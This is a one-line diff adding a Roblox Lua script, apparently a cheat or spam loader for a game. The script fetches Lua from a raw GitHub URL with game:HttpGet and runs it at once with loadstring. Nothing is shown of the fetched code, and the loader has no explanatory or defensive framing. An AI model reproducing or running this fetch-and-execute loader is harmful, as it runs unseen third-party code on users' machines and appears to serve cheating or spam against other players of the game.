@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SlowDamselLog/loaders/main/loaders/roll-a-stickman-spam2-zosfxclqof4k3o.lua"))()
